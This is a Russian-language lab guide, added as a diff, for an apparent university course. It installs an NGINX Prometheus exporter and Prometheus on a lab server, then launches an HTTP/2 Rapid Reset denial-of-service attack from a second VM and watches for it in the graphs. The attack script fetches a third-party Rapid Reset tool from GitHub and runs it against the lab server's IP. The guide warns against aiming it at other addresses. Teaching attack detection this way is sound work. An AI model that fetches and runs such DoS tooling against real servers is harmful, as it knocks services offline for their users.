@@ -1,0 +1,365 @@
+# ПЗ3: Prometheus + мониторинг + атака HTTP/2 Rapid Reset
+
+Работаем на том же сервере `gg server` (192.168.25.250), который вы подняли в ПЗ2. Он уже слушает 80/443 с HTTP/2 и TLS 1.3. Дополнительно понадобится третья ВМ — клон «Ubuntu» для атаки.
+
+Порядок: ручной блок A → скрипт 1 (nginx-exporter) → скрипт 2 (Prometheus) → ручной блок B (просмотр веб-интерфейса) → ручной блок C (клон атакующей ВМ) → скрипт 3 (атака) → ручной блок D (наблюдение в Prometheus) → диагностика.
+
+---
+
+## Ручной блок A: запуск ВМ и проброс портов
+
+1. Запустите **«gg Router»** и **«gg server»** (должны быть включены из ПЗ1–ПЗ2).
+2. На сервере зайдите по SSH: `ssh gg@127.0.0.25 -p 2225`, затем `sudo -i`.
+3. Добавьте проброс портов для веб-интерфейса Prometheus и экспортера (VirtualBox → Tools → Network → NAT Networks → `NatNetwork_gg` → Edit → Port Forwarding):
+
+| Name | Protocol | Host IP | Host Port | Guest IP | Guest Port |
+|---|---|---|---|---|---|
+| prometheus | TCP | 127.0.0.25 | 9090 | 192.168.25.250 | 9090 |
+| nginx-exporter | TCP | 127.0.0.25 | 9114 | 192.168.25.250 | 9114 |
+
+(Правила `http`, `https`, `ssh-server` из ПЗ2 уже должны быть на месте.)
+
+---
+
+## Скрипт 1: NGINX Prometheus Exporter (на `gg server`)
+
+```bash
+cat > /root/pz3_stage1.sh <<'EOF_S1'
+#!/bin/bash
+set -e
+export DEBIAN_FRONTEND=noninteractive
+
+echo "=== [1/6] snapd и nginx-prometheus-exporter ==="
+apt-get update
+apt-get install -y snapd
+systemctl enable --now snapd.socket snapd.service
+sleep 3
+# на некоторых ядрах snap требует перезахода - на всякий случай создаём симлинк заранее
+ln -sf /var/lib/snapd/snap /snap 2>/dev/null || true
+snap install core 2>/dev/null || true
+snap install nginx-prometheus-exporter
+
+echo "=== [2/6] Файл metrics (stub_status на 127.0.0.1:8080) ==="
+cat > /etc/nginx/sites-enabled/metrics <<'EOF'
+server {
+    listen 127.0.0.1:8080;
+    server_name _;
+    location /stub_status {
+        stub_status;
+    }
+}
+EOF
+nginx -t
+systemctl reload nginx
+
+echo "=== [3/6] Пользователь/группа nginx_exporter ==="
+getent group nginx_exporter >/dev/null || groupadd --system nginx_exporter
+id -u nginx_exporter >/dev/null 2>&1 || useradd -s /sbin/nologin --system -g nginx_exporter nginx_exporter
+mkdir -p /home/nginx_exporter
+chown -R nginx_exporter:nginx_exporter /home/nginx_exporter
+
+echo "=== [4/6] systemd: socket + service ==="
+cat > /etc/systemd/system/nginx-exporter.socket <<'EOF'
+[Unit]
+Description=NGINX Prometheus Exporter
+[Socket]
+ListenStream=0.0.0.0:9114
+[Install]
+WantedBy=sockets.target
+EOF
+
+EXPORTER_BIN=/snap/bin/nginx-prometheus-exporter
+cat > /etc/systemd/system/nginx-exporter.service <<EOF
+[Unit]
+Description=NGINX Prometheus Exporter
+Requires=nginx-exporter.socket
+[Service]
+User=nginx_exporter
+ExecStart=${EXPORTER_BIN} --nginx.scrape-uri=http://127.0.0.1:8080/stub_status --web.systemd-socket
+[Install]
+WantedBy=multi-user.target
+EOF
+
+echo "=== [5/6] Запуск ==="
+systemctl daemon-reload
+systemctl enable nginx-exporter.socket nginx-exporter.service
+systemctl start nginx-exporter.socket nginx-exporter.service
+sleep 2
+
+echo "=== [6/6] ПРОВЕРКА ==="
+systemctl status nginx-exporter.socket --no-pager | head -n 8
+systemctl status nginx-exporter.service --no-pager | head -n 8
+echo "--- stub_status ---"
+curl -s http://127.0.0.1:8080/stub_status
+echo "--- metrics (первые строки) ---"
+curl -s http://127.0.0.1:9114/metrics | head -n 15
+EOF_S1
+bash /root/pz3_stage1.sh
+```
+
+**Отличие от методички:** имена файлов `nginx_exporter.socket`/`.service` в тексте методички названы без дефиса, но на рис. 3.4–3.6 видно, что реальные unit-файлы — `nginx-exporter.socket`/`nginx-exporter.service` (через дефис). Я использовал вариант с дефисом, как на скриншотах, иначе `systemctl status nginx_exporter.socket` не найдёт юнит.
+
+Если `snap install` зависает или пишет `error: cannot communicate with server`, выполните `reboot` один раз (нужно для монтирования snapd squashfs-слоя), потом снова `bash /root/pz3_stage1.sh`.
+
+---
+
+## Скрипт 2: установка и настройка Prometheus
+
+```bash
+cat > /root/pz3_stage2.sh <<'EOF_S2'
+#!/bin/bash
+set -e
+PROM_VER="2.43.0"
+
+echo "=== [1/7] Пользователь/группа prometheus ==="
+getent group prometheus >/dev/null || groupadd --system prometheus
+id -u prometheus >/dev/null 2>&1 || useradd -s /sbin/nologin --system -g prometheus prometheus
+
+echo "=== [2/7] Директории ==="
+mkdir -p /etc/prometheus /var/lib/prometheus
+
+echo "=== [3/7] Загрузка Prometheus ==="
+cd /tmp
+rm -rf prometheus-${PROM_VER}.linux-amd64 prometheus-${PROM_VER}.linux-amd64.tar.gz
+wget -q https://github.com/prometheus/prometheus/releases/download/v${PROM_VER}/prometheus-${PROM_VER}.linux-amd64.tar.gz
+tar xzf prometheus-${PROM_VER}.linux-amd64.tar.gz
+cd prometheus-${PROM_VER}.linux-amd64
+
+echo "=== [4/7] Копирование бинарников и файлов ==="
+cp prometheus /usr/local/bin/
+cp promtool /usr/local/bin/
+chown prometheus:prometheus /usr/local/bin/prometheus /usr/local/bin/promtool
+
+cp -r consoles /etc/prometheus/
+cp -r console_libraries /etc/prometheus/
+cp prometheus.yml /etc/prometheus/prometheus.yml.orig
+chown -R prometheus:prometheus /etc/prometheus/
+chown -R prometheus:prometheus /var/lib/prometheus
+
+echo "=== [5/7] Конфиг prometheus.yml ==="
+cat > /etc/prometheus/prometheus.yml <<'EOF'
+global:
+  scrape_interval: 1s
+  evaluation_interval: 1s
+  scrape_timeout: 1s
+  external_labels:
+    monitor: 'gg-project'
+scrape_configs:
+  - job_name: "nginx"
+    static_configs:
+      - targets: ["127.0.0.1:9114"]
+    metrics_path: "/metrics"
+    scrape_interval: 1s
+EOF
+chown prometheus:prometheus /etc/prometheus/prometheus.yml
+
+echo "=== [6/7] systemd service ==="
+cat > /etc/systemd/system/prometheus.service <<'EOF'
+[Unit]
+Description=Prometheus
+Wants=network-online.target
+After=network-online.target
+[Service]
+User=prometheus
+Group=prometheus
+Type=simple
+ExecStart=/usr/local/bin/prometheus \
+    --config.file /etc/prometheus/prometheus.yml \
+    --storage.tsdb.path /var/lib/prometheus/ \
+    --web.console.templates=/etc/prometheus/consoles \
+    --web.console.libraries=/etc/prometheus/console_libraries
+[Install]
+WantedBy=multi-user.target
+EOF
+
+echo "=== [7/7] Запуск и проверка ==="
+systemctl daemon-reload
+systemctl enable prometheus
+systemctl start prometheus
+sleep 2
+systemctl status prometheus --no-pager | head -n 10
+systemctl status nginx-exporter.socket nginx-exporter.service --no-pager | head -n 16
+echo "--- Открытые порты ---"
+sudo ss -tlpn | grep -E ':9090|:9114|:80|:443'
+echo "ГОТОВО. Откройте http://127.0.0.25:9090"
+EOF_S2
+bash /root/pz3_stage2.sh
+```
+
+---
+
+## Ручной блок B: веб-интерфейс Prometheus
+
+1. На хосте откройте **http://127.0.0.25:9090**.
+2. Проверьте, что цель видна и активна: **Status → Targets**. У job `nginx` state должен быть **UP**.
+3. Выполните тестовый запрос (рис. 3.11 методички): в поле запроса введите `nginx_http_requests_total` → Execute → вкладка **Graph**. Сделайте скриншот растущего графика.
+4. Также сделайте скриншот страницы **http://127.0.0.25:8080/stub_status** — но учтите: она слушает только `127.0.0.1`, поэтому напрямую с хоста не откроется. Смотрите её через SSH:
+   ```bash
+   curl http://127.0.0.1:8080/stub_status
+   ```
+   и прикладывайте текстовый вывод в отчёт (как на рис. 3.3), либо временно добавьте проброс `127.0.0.25:8080 → 192.168.25.250:8080` и смените `listen 127.0.0.1:8080` на `listen 0.0.0.0:8080` — но после скриншота верните как было (эта страница не должна быть доступна извне в проде).
+
+---
+
+## Ручной блок C: клонирование и запуск атакующей ВМ
+
+Нужна отдельная ВМ в той же сети `NatNetwork_gg`, с которой будет исходить атака — в методичке это **«Surname Ubuntu»**.
+
+1. В VirtualBox клонируйте базовый образ **«Ubuntu»** (тот, что использовался в ПЗ1 как клиентская машина) → имя **«gg Ubuntu»**.
+2. Settings → Network → Adapter 1 → Attached to **NAT Network** → `NatNetwork_gg`.
+3. Запустите ВМ. Она получит адрес по DHCP от «gg Router» (диапазон 192.168.25.10–192.168.25.20).
+4. Войдите в систему, откройте терминал, проверьте связь:
+   ```bash
+   ip -br a
+   ping -c2 192.168.25.250
+   ```
+5. Дальше весь скрипт 3 выполняется **на этой атакующей ВМ**, не на сервере.
+
+---
+
+## Скрипт 3: загрузка и запуск Rapid Reset (на `gg Ubuntu`)
+
+```bash
+cat > ~/pz3_attack.sh <<'EOF_S3'
+#!/bin/bash
+set -e
+TARGET_IP="192.168.25.250"
+TARGET_URL="https://${TARGET_IP}:443"
+REQUESTS=1000
+
+echo "=== [1/4] Зависимости ==="
+sudo apt-get update
+sudo apt-get install -y wget curl ca-certificates
+
+echo "=== [2/4] Загрузка скриптов атаки ==="
+mkdir -p ~/rapidreset && cd ~/rapidreset
+wget -q -O rapidresetclient "https://github.com/Millen93/HTTP-2.0-Rapid-Reset-Attack-Laboratory/raw/main/dos_script/rapidresetclient"
+wget -q -O attack.sh "https://raw.githubusercontent.com/Millen93/HTTP-2.0-Rapid-Reset-Attack-Laboratory/main/dos_script/attack.sh"
+chmod +x rapidresetclient attack.sh
+
+echo "=== [3/4] Проверка доступности цели ==="
+curl -sk -o /dev/null -w "HTTP status: %{http_code}\n" "$TARGET_URL" || true
+
+echo "=== [4/4] Запуск атаки: ${REQUESTS} запросов на ${TARGET_URL} ==="
+./attack.sh -u "$TARGET_URL" -r "$REQUESTS"
+EOF_S3
+chmod +x ~/pz3_attack.sh
+~/pz3_attack.sh
+```
+
+**Важные нюансы:**
+- Если `rapidresetclient` не запускается (`Permission denied`/`cannot execute binary file`), значит скачанный файл — не готовый бинарник, а исходный код на Go. Тогда соберите его сами:
+  ```bash
+  sudo apt-get install -y golang-go
+  cd ~/rapidreset
+  file rapidresetclient        # если показывает "ASCII text" — это исходник
+  mv rapidresetclient rapidresetclient.go
+  go build -o rapidresetclient rapidresetclient.go
+  chmod +x rapidresetclient
+  ```
+- Атака идёт по IP `192.168.25.250`, а не по доменному имени — у клиента не прописан `gg.bsuir.lab` в hosts, а TLS с самоподписанным сертификатом и так не проверяет имя при `-k`/игнорировании ошибок клиентом атаки.
+- Атака создаёт нагрузку на ваш собственный учебный стенд — **не запускайте дольше нескольких минут** и не нацеливайте на посторонние адреса.
+
+Параллельно откройте вторую сессию SSH на сервере и смотрите нагрузку живьём:
+```bash
+watch -n1 'curl -s http://127.0.0.1:9114/metrics | grep -E "nginx_http_requests_total|nginx_connections_(active|reading|writing|waiting)"'
+```
+
+---
+
+## Ручной блок D: наблюдение результата в Prometheus
+
+1. Во время/сразу после атаки откройте **http://127.0.0.25:9090/graph**.
+2. Введите запрос из методички (рис. 3.13):
+   ```
+   increase(nginx_http_requests_total[5m])
+   ```
+   Execute → вкладка Graph. Должен появиться резкий скачок вверх (рост числа запросов за счёт лавины GET+RST_STREAM), затем выход на плато после остановки атаки.
+3. Дополнительно можно посмотреть `nginx_connections_writing` и `nginx_connections_waiting` — тоже подскочат во время атаки.
+4. Сделайте скриншот графика с явно видимой «ступенькой» — это и есть демонстрация обнаружения Rapid Reset через мониторинг.
+5. После атаки проверьте, что nginx жив:
+   ```bash
+   systemctl status nginx --no-pager | head -5
+   curl -skI https://192.168.25.250
+   ```
+
+---
+
+## Команды диагностики (для отчёта и вопросов преподавателя)
+
+```bash
+############ 1. NGINX Exporter ############
+systemctl status nginx-exporter.socket --no-pager
+systemctl status nginx-exporter.service --no-pager
+systemctl is-active nginx-exporter.socket nginx-exporter.service
+systemctl is-enabled nginx-exporter.socket nginx-exporter.service
+curl -s http://127.0.0.1:8080/stub_status          # Active connections, server accepts/handled/requests
+curl -s http://127.0.0.1:9114/metrics | head -30     # метрики в формате Prometheus
+cat /etc/nginx/sites-enabled/metrics
+cat /etc/systemd/system/nginx-exporter.socket
+cat /etc/systemd/system/nginx-exporter.service
+id nginx_exporter                                    # группа nginx_exporter, shell /sbin/nologin
+ls -ld /home/nginx_exporter
+
+############ 2. Prometheus ############
+systemctl status prometheus --no-pager
+systemctl is-active prometheus
+systemctl is-enabled prometheus
+cat /etc/prometheus/prometheus.yml
+cat /etc/systemd/system/prometheus.service
+id prometheus
+ls -l /usr/local/bin/prometheus /usr/local/bin/promtool
+stat -c '%U:%G %n' /etc/prometheus /var/lib/prometheus
+/usr/local/bin/promtool check config /etc/prometheus/prometheus.yml
+/usr/local/bin/prometheus --version
+
+############ 3. Сетевые порты (что реально слушается) ############
+sudo ss -tlpn | grep -E ':80|:443|:9090|:9114|:3306|:22'
+sudo ss -tlpn                                        # полный список
+
+############ 4. Проверка через API/веб ############
+curl -s http://127.0.0.1:9090/-/healthy              # Prometheus is Healthy.
+curl -s http://127.0.0.1:9090/-/ready
+curl -s "http://127.0.0.1:9090/api/v1/targets" | python3 -m json.tool | grep -E 'health|job|scrapeUrl'
+curl -s "http://127.0.0.1:9090/api/v1/query?query=nginx_http_requests_total" | python3 -m json.tool
+
+############ 5. HTTP/2 на сервере (нужен для атаки) ############
+nginx -T | grep -E 'listen.*http2|listen.*443'
+curl -vkI --http2 https://localhost 2>&1 | grep -Ei 'HTTP/2|ALPN'
+
+############ 6. Логи ############
+journalctl -u nginx-exporter.service -n 30 --no-pager
+journalctl -u prometheus -n 30 --no-pager
+tail -n 30 /var/log/nginx/error.log
+tail -n 30 /var/log/nginx/access.log                 # всплеск запросов во время атаки виден по времени
+
+############ 7. Нагрузка/процессы во время и после атаки ############
+top -bn1 | head -15
+ps aux | grep nginx
+sudo ss -tn state established '( dport = :443 or sport = :443 )' | wc -l   # число активных TLS-соединений
+```
+
+### На атакующей ВМ (`gg Ubuntu`)
+```bash
+ls -l ~/rapidreset/
+file ~/rapidreset/rapidresetclient        # ELF бинарник или текст (исходник)
+cat ~/rapidreset/attack.sh
+```
+
+---
+
+## Чек-лист скриншотов для отчёта
+
+1. `systemctl status nginx-exporter.socket` и `nginx-exporter.service` — active (running).
+2. Содержимое файлов `metrics`, `nginx-exporter.socket`, `nginx-exporter.service`.
+3. Вывод `curl http://127.0.0.1:8080/stub_status`.
+4. Вывод `curl http://127.0.0.1:9114/metrics` (фрагмент).
+5. `systemctl status prometheus` — active (running); содержимое `prometheus.yml` и `prometheus.service`.
+6. Список открытых портов `ss -tlpn` (видно 9090, 9114, 80, 443).
+7. Страница **Status → Targets** в Prometheus — job `nginx`, state **UP**.
+8. График `nginx_http_requests_total` в спокойном состоянии (рис. 3.11 методички).
+9. Запуск `attack.sh` на атакующей ВМ (вывод в терминале).
+10. График `increase(nginx_http_requests_total[5m])` с явным скачком во время атаки (рис. 3.13 методички).
+11. Проверка, что nginx остался работоспособен после атаки (`curl -I https://...`).
+
+Если какой-то из скриптов упадёт (особенно `snap install` или загрузка Prometheus — иногда GitHub release недоступен из вашей сети), пришлите вывод последних 15–20 строк, разберёмся.
